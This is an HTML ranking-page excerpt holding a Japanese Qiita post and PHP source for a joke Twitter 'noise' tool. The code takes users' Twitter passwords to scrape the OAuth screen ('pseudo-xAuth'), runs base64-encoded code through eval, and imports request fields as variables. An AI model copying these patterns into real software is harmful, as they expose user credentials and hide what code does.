            <span class="k">return</span> <span class="nb">strrchr</span><span class="p">(</span><span class="nv">$formatted</span><span class="p">,</span> <span class="s1">'-'</span><span class="p">)</span> <span class="o">!==</span> <span class="s1">'-'</span> <span class="o">?</span> <span class="nv">$formatted</span> <span class="o">:</span> <span class="nv">$input</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nv">$pattern</span> <span class="o">=</span> <span class="s1">'/\A(00(?:[013-8]|2\d|91[02-9])\d)(\d++)\z/'</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$number</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s1">'-'</span> <span class="o">.</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$input</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />17位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>74</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/1590bff0fe0173e50bf2">ノ҉イ҉ズ҉入҉れ҉る҉や҉つ</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-09-28 15:03:26</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[Twitter]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="ノ҉イ҉ズ҉入҉れ҉る҉や҉つ" class="fragment"></span><a href="#%E3%83%8E%D2%89%E3%82%A4%D2%89%E3%82%BA%D2%89%E5%85%A5%D2%89%E3%82%8C%D2%89%E3%82%8B%D2%89%E3%82%84%D2%89%E3%81%A4"><i class="fa fa-link"></i></a><strong>ノ҉イ҉ズ҉入҉れ҉る҉や҉つ</strong>
</h1>

<p>ありそうで無かったので遊びがてら作ってみました。<br>
<a href="http://www53.atpages.jp/noiser/" class="autolink" rel="nofollow noopener" target="_blank">http://www53.atpages.jp/noiser/</a></p>

<h2>
<span id="これ何" class="fragment"></span><a href="#%E3%81%93%E3%82%8C%E4%BD%95"><i class="fa fa-link"></i></a>これ何？</h2>

<p>使ってみれば分かります。</p>

<h2>
<span id="疑似xauth認証-って何" class="fragment"></span><a href="#%E7%96%91%E4%BC%BCxauth%E8%AA%8D%E8%A8%BC-%E3%81%A3%E3%81%A6%E4%BD%95"><i class="fa fa-link"></i></a><strong>疑似xAuth認証</strong> って何？</h2>

<p>OAuth認証画面をスクレイピングして、OAuth認証をあたかもxAuth認証のようにやってのける<del>アウトな</del>技術のことです。パスワード直接入れたりするのが不安な方は普通のOAuth認証も選べますのでそちらでどうぞ。</p>

<h2>
<span id="コンシューマーキーとか入れなくておｋ" class="fragment"></span><a href="#%E3%82%B3%E3%83%B3%E3%82%B7%E3%83%A5%E3%83%BC%E3%83%9E%E3%83%BC%E3%82%AD%E3%83%BC%E3%81%A8%E3%81%8B%E5%85%A5%E3%82%8C%E3%81%AA%E3%81%8F%E3%81%A6%E3%81%8A%EF%BD%8B"><i class="fa fa-link"></i></a>コンシューマーキーとか入れなくておｋ？</h2>

<p>省略した場合は <strong>「ノ҉イ҉ズ҉入҉れ҉る҉や҉つ」</strong> のものが使われます。<br>
入力した場合はそれが使われます。</p>

<h2>
<span id="atpagesなのに何で広告出てないの" class="fragment"></span><a href="#atpages%E3%81%AA%E3%81%AE%E3%81%AB%E4%BD%95%E3%81%A7%E5%BA%83%E5%91%8A%E5%87%BA%E3%81%A6%E3%81%AA%E3%81%84%E3%81%AE"><i class="fa fa-link"></i></a>atpagesなのに何で広告出てないの？</h2>

<p><del><code>header</code> 関数で <em>Content-Type</em> を <strong><code>application/xhtml+xml</code></strong> にしてあげると、<br>
一応 <strong>XML</strong> 扱いになって広告表示対象から外されるみたいです！<br>
これはおいしい・・・</del></p>

<p>なんと <strong>charset</strong> 指定するだけでOKみたいです…！</p>

<h2>
<span id="ソースコード見せて" class="fragment"></span><a href="#%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89%E8%A6%8B%E3%81%9B%E3%81%A6"><i class="fa fa-link"></i></a>ソースコード見せて？</h2>

<p>コンシューマーキーは伏せてますがどうぞ。あと何か無理矢理1ファイルにまとめたいとか願うにもかかわらず長ったらしいのは隠蔽したいみたいな駄々をこねてソースコードの一部をBASE64エンコードして埋め込むとか意味不明なことやらかしてますが許してください（震え声）</p>

<h3>
<span id="闇に葬られたコード" class="fragment"></span><a href="#%E9%97%87%E3%81%AB%E8%91%AC%E3%82%89%E3%82%8C%E3%81%9F%E3%82%B3%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a>闇に葬られたコード</h3>

<ul>
<li>
<strong><a href="https://github.com/Certainist/TwistOAuth" rel="nofollow noopener" target="_blank">TwistOAuth</a></strong> Version 1.0.1</li>
<li>
<strong>h</strong> 関数(HTML特殊文字エスケープするやつ)</li>
<li>
<strong><a href="http://qiita.com/mpyw/items/7852213f478e8c5a2802#2-24" id="reference-30d6dccb6f480b7ae2f3">extensible_session_start</a></strong> 関数</li>
</ul>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="cm">/* クラスと関数読み込み */</span>
<span class="k">eval</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="nx">__COMPILER_HALT_OFFSET__</span><span class="p">)));</span>

<span class="cm">/* APIキー設定 */</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'CONSUMER_KEY'</span><span class="p">,</span> <span class="s1">''</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'CONSUMER_SECRET'</span><span class="p">,</span> <span class="s1">''</span><span class="p">);</span>

<span class="c1">// セッションを最終アクセスから有効期限1週間で開始</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.gc_maxlifetime'</span><span class="p">,</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">7</span><span class="p">);</span>
<span class="nx">extensible_session_start</span><span class="p">(</span><span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">7</span><span class="p">);</span>

<span class="c1">// $_REQUEST から指定した項目を文字列としてインポート</span>
<span class="nv">$params</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="s1">'para_xauth'</span><span class="p">,</span>
    <span class="s1">'oauth_start'</span><span class="p">,</span>
    <span class="s1">'oauth_verifier'</span><span class="p">,</span>
    <span class="s1">'tweet'</span><span class="p">,</span>
    <span class="s1">'logout'</span><span class="p">,</span>
    <span class="s1">'auto_in_reply_to_status_id'</span><span class="p">,</span>
    <span class="s1">'fujiwara'</span><span class="p">,</span>
    <span class="s1">'consumer_key'</span><span class="p">,</span>
    <span class="s1">'consumer_secret'</span><span class="p">,</span>
    <span class="s1">'username'</span><span class="p">,</span>
    <span class="s1">'password'</span><span class="p">,</span>
    <span class="s1">'density'</span><span class="p">,</span>
    <span class="s1">'header'</span><span class="p">,</span>
    <span class="s1">'text'</span><span class="p">,</span>
    <span class="s1">'footer'</span><span class="p">,</span>
<span class="p">);</span>
<span class="k">foreach</span> <span class="p">(</span><span class="nv">$params</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$$v</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nv">$v</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nv">$v</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="nv">$v</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// ノイズ濃度を0～10の整数値に強制変換</span>
<span class="nv">$density</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="nb">max</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$density</span><span class="p">));</span>

<span class="c1">// メッセージ配列を初期化</span>
<span class="nv">$msgs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>

<span class="k">try</span> <span class="p">{</span>

    <span class="c1">// TwistOAuthオブジェクト初期化</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'to'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="c1">// 自前のAPIキーが指定されたとき</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$consumer_key</span> <span class="o">===</span> <span class="s1">''</span> <span class="o">||</span> <span class="nv">$consumer_secret</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$tc</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TwistCredential</span><span class="p">(</span><span class="nx">CONSUMER_KEY</span><span class="p">,</span> <span class="nx">CONSUMER_SECRET</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
        <span class="p">}</span> 
        <span class="c1">// デフォルトのAPIキーを使用するとき</span>
        <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$tc</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TwistCredential</span><span class="p">(</span><span class="nv">$consumer_key</span><span class="p">,</span> <span class="nv">$consumer_secret</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="c1">// セッションにTwistOAuthオブジェクトを格納</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'to'</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TwistOAuth</span><span class="p">(</span><span class="nv">$tc</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">// 書きやすいように $_SESSION['to'] を $to に落とす</span>
    <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'to'</span><span class="p">];</span>

    <span class="c1">// 未ログイン時</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$to</span><span class="o">-&gt;</span><span class="na">credential</span><span class="o">-&gt;</span><span class="na">accessToken</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="c1">// 疑似xAuth認証</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$para_xauth</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$to</span><span class="o">-&gt;</span><span class="na">login</span><span class="p">();</span>
                <span class="nv">$msgs</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'success'</span><span class="p">,</span> <span class="s2">"[Login] Logined as @</span><span class="si">{</span><span class="nv">$res</span><span class="o">-&gt;</span><span class="na">screen_name</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
                <span class="c1">// ログイン成功時、セッション固定攻撃対策の為セッションIDを変更する</span>
                <span class="nb">session_regenerate_id</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// OAuth認証: リクエストトークン取得時</span>
            <span class="k">elseif</span> <span class="p">(</span><span class="nv">$oauth_start</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$to</span><span class="o">-&gt;</span><span class="na">postAuto</span><span class="p">(</span><span class="s1">'oauth/request_token'</span><span class="p">);</span>
                <span class="c1">// Twitterの認証ページに飛ばす</span>
                <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: '</span> <span class="o">.</span> <span class="nv">$to</span><span class="o">-&gt;</span><span class="na">credential</span><span class="o">-&gt;</span><span class="na">getAuthorizeUrl</span><span class="p">());</span>
                <span class="k">exit</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="c1">// OAuth認証: アクセストークン取得時</span>
            <span class="k">elseif</span> <span class="p">(</span><span class="nv">$oauth_verifier</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$to</span><span class="o">-&gt;</span><span class="na">credential</span><span class="o">-&gt;</span><span class="na">setVerifier</span><span class="p">(</span><span class="nv">$oauth_verifier</span><span class="p">);</span>
                <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$to</span><span class="o">-&gt;</span><span class="na">postAuto</span><span class="p">(</span><span class="s1">'oauth/access_token'</span><span class="p">);</span>
                <span class="nv">$msgs</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'success'</span><span class="p">,</span> <span class="s2">"[Login] Logined as @</span><span class="si">{</span><span class="nv">$res</span><span class="o">-&gt;</span><span class="na">screen_name</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
                <span class="c1">// ログイン成功時、セッション固定攻撃対策の為セッションIDを変更する</span>
                <span class="nb">session_regenerate_id</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">TwistException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// ログイン途中で失敗したときはセッションのTwistOAuthオブジェクトを破棄する</span>
            <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'to'</span><span class="p">]);</span>
            <span class="k">throw</span> <span class="nv">$e</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// ログアウト時</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$logout</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$_SESSION</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$msgs</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'info'</span><span class="p">,</span> <span class="s1">'[Logout] Done.'</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// ツイート実行時</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$tweet</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$body</span> <span class="o">=</span> <span class="nv">$text</span><span class="p">;</span>
        <span class="c1">// 藤原竜也的な置換をして $header, $text, $footer やその他オプションをもとに $body を組み立てる</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$fujiwara</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$body</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span>
                <span class="k">array</span><span class="p">(</span>
                    <span class="s1">'ﾞ'</span><span class="p">,</span> <span class="s1">'゛'</span><span class="p">,</span>
                    <span class="s1">'う'</span><span class="p">,</span> <span class="s1">'ウ'</span><span class="p">,</span>
                    <span class="s1">'か'</span><span class="p">,</span> <span class="s1">'き'</span><span class="p">,</span> <span class="s1">'く'</span><span class="p">,</span> <span class="s1">'け'</span><span class="p">,</span> <span class="s1">'こ'</span><span class="p">,</span>
                    <span class="s1">'さ'</span><span class="p">,</span> <span class="s1">'し'</span><span class="p">,</span> <span class="s1">'す'</span><span class="p">,</span> <span class="s1">'せ'</span><span class="p">,</span> <span class="s1">'そ'</span><span class="p">,</span>
                    <span class="s1">'た'</span><span class="p">,</span> <span class="s1">'ち'</span><span class="p">,</span> <span class="s1">'つ'</span><span class="p">,</span> <span class="s1">'て'</span><span class="p">,</span> <span class="s1">'と'</span><span class="p">,</span>
                    <span class="s1">'は'</span><span class="p">,</span> <span class="s1">'ひ'</span><span class="p">,</span> <span class="s1">'ふ'</span><span class="p">,</span> <span class="s1">'へ'</span><span class="p">,</span> <span class="s1">'ほ'</span><span class="p">,</span>
                    <span class="s1">'カ'</span><span class="p">,</span> <span class="s1">'キ'</span><span class="p">,</span> <span class="s1">'ク'</span><span class="p">,</span> <span class="s1">'ケ'</span><span class="p">,</span> <span class="s1">'コ'</span><span class="p">,</span>
                    <span class="s1">'サ'</span><span class="p">,</span> <span class="s1">'シ'</span><span class="p">,</span> <span class="s1">'ス'</span><span class="p">,</span> <span class="s1">'セ'</span><span class="p">,</span> <span class="s1">'ソ'</span><span class="p">,</span>
                    <span class="s1">'タ'</span><span class="p">,</span> <span class="s1">'チ'</span><span class="p">,</span> <span class="s1">'ツ'</span><span class="p">,</span> <span class="s1">'テ'</span><span class="p">,</span> <span class="s1">'ト'</span><span class="p">,</span>
                    <span class="s1">'ハ'</span><span class="p">,</span> <span class="s1">'ヒ'</span><span class="p">,</span> <span class="s1">'フ'</span><span class="p">,</span> <span class="s1">'ヘ'</span><span class="p">,</span> <span class="s1">'ホ'</span><span class="p">,</span>
                <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span>
                    <span class="s1">''</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span>
                    <span class="s1">'ゔ'</span><span class="p">,</span> <span class="s1">'ヴ'</span><span class="p">,</span>
                    <span class="s1">'が'</span><span class="p">,</span> <span class="s1">'ぎ'</span><span class="p">,</span> <span class="s1">'ぐ'</span><span class="p">,</span> <span class="s1">'げ'</span><span class="p">,</span> <span class="s1">'ご'</span><span class="p">,</span>
                    <span class="s1">'ざ'</span><span class="p">,</span> <span class="s1">'じ'</span><span class="p">,</span> <span class="s1">'ず'</span><span class="p">,</span> <span class="s1">'ぜ'</span><span class="p">,</span> <span class="s1">'ぞ'</span><span class="p">,</span>
                    <span class="s1">'だ'</span><span class="p">,</span> <span class="s1">'ぢ'</span><span class="p">,</span> <span class="s1">'づ'</span><span class="p">,</span> <span class="s1">'で'</span><span class="p">,</span> <span class="s1">'ど'</span><span class="p">,</span>
                    <span class="s1">'ば'</span><span class="p">,</span> <span class="s1">'び'</span><span class="p">,</span> <span class="s1">'ぶ'</span><span class="p">,</span> <span class="s1">'べ'</span><span class="p">,</span> <span class="s1">'ぼ'</span><span class="p">,</span>
                    <span class="s1">'ガ'</span><span class="p">,</span> <span class="s1">'ギ'</span><span class="p">,</span> <span class="s1">'グ'</span><span class="p">,</span> <span class="s1">'ゲ'</span><span class="p">,</span> <span class="s1">'ゴ'</span><span class="p">,</span>
                    <span class="s1">'ザ'</span><span class="p">,</span> <span class="s1">'ジ'</span><span class="p">,</span> <span class="s1">'ズ'</span><span class="p">,</span> <span class="s1">'ゼ'</span><span class="p">,</span> <span class="s1">'ゾ'</span><span class="p">,</span>
                    <span class="s1">'ダ'</span><span class="p">,</span> <span class="s1">'ヂ'</span><span class="p">,</span> <span class="s1">'ヅ'</span><span class="p">,</span> <span class="s1">'デ'</span><span class="p">,</span> <span class="s1">'ド'</span><span class="p">,</span>
                    <span class="s1">'バ'</span><span class="p">,</span> <span class="s1">'ビ'</span><span class="p">,</span> <span class="s1">'ブ'</span><span class="p">,</span> <span class="s1">'ベ'</span><span class="p">,</span> <span class="s1">'ボ'</span><span class="p">,</span>
                <span class="p">),</span>
                <span class="nv">$body</span>
            <span class="p">);</span>
            <span class="nv">$pattern</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
                <span class="s1">'ぁ-かきくけこさしすせそたちつってとな-のはひふへほぱぴぷぺぽま-んゕゖ'</span><span class="p">,</span>
                <span class="s1">'ァ-カキクケコサシスセソタチツッテトナ-ノハヒフヘホマ-ンヵヶ'</span><span class="p">,</span>
                <span class="s1">'ㇰ-ㇿ'</span><span class="p">,</span>
                <span class="s1">'一-龥朗-鶴'</span><span class="p">,</span>
                <span class="s1">'Ａ-Ｚａ-ｚ０-９'</span><span class="p">,</span>
                <span class="s1">'ｦ-ｯｧ-ﾝ'</span><span class="p">,</span>
                <span class="s1">'A-Za-z0-9'</span><span class="p">,</span>
            <span class="p">));</span>
            <span class="nv">$body</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">"/[</span><span class="si">{</span><span class="nv">$pattern</span><span class="si">}</span><span class="s2">]/u"</span><span class="p">,</span> <span class="s1">'$0ﾞ'</span><span class="p">,</span> <span class="nv">$body</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="c1">// ノイズを被せる</span>
        <span class="nv">$pattern</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'|'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
            <span class="s2">"\A[</span><span class="se">\\</span><span class="s2">0</span><span class="se">\x01</span><span class="s2">-</span><span class="se">\x7f\xef\xbd\xa1</span><span class="s2">-</span><span class="se">\xef\xbe\x9f</span><span class="s2">]"</span><span class="p">,</span>
            <span class="s2">"[</span><span class="se">\\</span><span class="s2">0</span><span class="se">\x01</span><span class="s2">-</span><span class="se">\x7f\xef\xbd\xa1</span><span class="s2">-</span><span class="se">\xef\xbe\x9f</span><span class="s2">]{1,2}+"</span><span class="p">,</span>
            <span class="s1">'.'</span><span class="p">,</span>
            <span class="s1">'\A\z'</span><span class="p">,</span>
        <span class="p">));</span>
        <span class="nv">$matches</span> <span class="o">=</span> <span class="nb">preg_match_all</span><span class="p">(</span><span class="s2">"/</span><span class="si">{</span><span class="nv">$pattern</span><span class="si">}</span><span class="s2">/us"</span><span class="p">,</span> <span class="nv">$body</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">)</span> <span class="o">?</span>
            <span class="nv">$matches</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">:</span>
            <span class="k">array</span><span class="p">()</span>
        <span class="p">;</span>
        <span class="nv">$body</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="nb">str_repeat</span><span class="p">(</span><span class="s2">"</span><span class="se">\xd2\x89</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$density</span><span class="p">),</span> <span class="nv">$matches</span><span class="p">);</span>
        <span class="nv">$body</span> <span class="o">=</span> <span class="nv">$header</span> <span class="o">.</span> <span class="nv">$body</span> <span class="o">.</span> <span class="nv">$footer</span><span class="p">;</span>
        <span class="c1">// 直近の自分へのリプライに対してin_reply_to_status_idを自動的に付加する</span>
        <span class="k">switch</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">case</span> <span class="o">!</span><span class="nv">$auto_in_reply_to_status_id</span><span class="o">:</span>
            <span class="k">case</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/@(\w{1,15}+)/'</span><span class="p">,</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$header</span><span class="si">}</span><span class="se">\0</span><span class="si">{</span><span class="nv">$footer</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">)</span><span class="o">:</span>
            <span class="k">case</span> <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$to</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span>
                <span class="s1">'statuses/user_timeline'</span><span class="p">,</span>
                <span class="s1">'count=200&amp;screen_name='</span> <span class="o">.</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
            <span class="p">)</span> <span class="nx">instanceof</span> <span class="nx">TwistException</span><span class="o">:</span>
            <span class="k">case</span> <span class="o">!</span><span class="p">(</span><span class="nv">$res</span> <span class="o">=</span> <span class="nb">array_filter</span><span class="p">(</span><span class="nv">$res</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$status</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nv">$status</span><span class="o">-&gt;</span><span class="na">in_reply_to_screen_name</span> <span class="o">===</span> <span class="nv">$to</span><span class="o">-&gt;</span><span class="na">credential</span><span class="o">-&gt;</span><span class="na">screenName</span><span class="p">;</span>
            <span class="p">}))</span><span class="o">:</span>
                <span class="nv">$in_reply_to_status_id</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">default</span><span class="o">:</span>
                <span class="nv">$in_reply_to_status_id</span> <span class="o">=</span> <span class="nb">reset</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">id_str</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="c1">// ツイートを実行</span>
        <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$to</span><span class="o">-&gt;</span><span class="na">postAuto</span><span class="p">(</span><span class="s1">'statuses/update'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
            <span class="s1">'status'</span> <span class="o">=&gt;</span> <span class="nv">$body</span><span class="p">,</span>
            <span class="s1">'in_reply_to_status_id'</span> <span class="o">=&gt;</span> <span class="nv">$in_reply_to_status_id</span><span class="p">,</span>
        <span class="p">));</span>
        <span class="nv">$tmp</span> <span class="o">=</span> <span class="s2">"[Tweet] </span><span class="si">{</span><span class="nv">$res</span><span class="o">-&gt;</span><span class="na">text</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$res</span><span class="o">-&gt;</span><span class="na">in_reply_to_status_id</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$tmp</span> <span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span>
                <span class="s1">' (in reply to &lt;a href="http://twitter.com/%1$s/status/%2$s" target="_blank"&gt;%2$s&lt;/a&gt;)'</span><span class="p">,</span>
                <span class="nv">$res</span><span class="o">-&gt;</span><span class="na">in_reply_to_screen_name</span><span class="p">,</span>
                <span class="nv">$res</span><span class="o">-&gt;</span><span class="na">in_reply_to_status_id_str</span>
            <span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$msgs</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'success'</span><span class="p">,</span> <span class="nv">$tmp</span><span class="p">);</span>
        <span class="c1">// 本文のみ内容をクリアする</span>
        <span class="nv">$text</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">TwistException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>

    <span class="nv">$msgs</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'danger'</span><span class="p">,</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">());</span>

<span class="p">}</span>

<span class="c1">// XHTMLヘッダーを優先的に送信する</span>
<span class="nb">header</span><span class="p">(</span>
    <span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_ACCEPT'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_ACCEPT'</span><span class="p">],</span> <span class="s1">'application/xhtml+xml'</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="o">?</span>
    <span class="s1">'Content-Type: application/xhtml+xml; charset=utf-8'</span> <span class="o">:</span>
    <span class="s1">'Content-Type: text/html; charset=utf-8'</span>
<span class="p">);</span>

<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">"http://www.w3.org/1999/xhtml"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content</span><span class="o">=</span><span class="s">"IE=edge"</span> <span class="p">/&gt;</span>
  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"viewport"</span> <span class="na">content</span><span class="o">=</span><span class="s">"width=device-width, initial-scale=1"</span> <span class="p">/&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>ノイズ入れるやつ<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
